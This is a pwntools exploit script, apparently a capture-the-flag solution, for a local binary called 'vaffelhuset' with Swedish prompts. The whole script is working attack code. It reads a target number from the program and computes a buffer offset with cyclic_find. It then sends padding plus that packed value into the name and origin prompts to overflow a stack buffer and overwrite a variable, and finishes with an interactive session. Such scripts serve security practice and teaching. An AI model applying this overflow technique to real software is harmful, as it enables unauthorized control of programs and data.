#!/usr/bin/env python3

from pwn import *

io = process('./vaffelhuset')
io.recvuntil(b'----> ')
target_waffles = int(io.recvuntil(' ').decode().strip())
log.info(f'Target waffles: {target_waffles}')

padding = cyclic_find(p64(7020092990037909857))
payload = b'A'*padding + p64(target_waffles)

io.recvline_contains('Hur gammal är du?'.encode())
io.recvuntil(b'> ')
io.sendline(str(30).encode())

io.recvline_contains('Vad heter du?'.encode())
io.recvuntil(b'> ')
#io.sendline(cyclic(64))
io.sendline(payload)


io.recvline_contains('Var kommer du ifrån?'.encode())
io.recvuntil(b'> ')
#io.sendline(cyclic(64))
io.sendline(payload)

io.interactive()
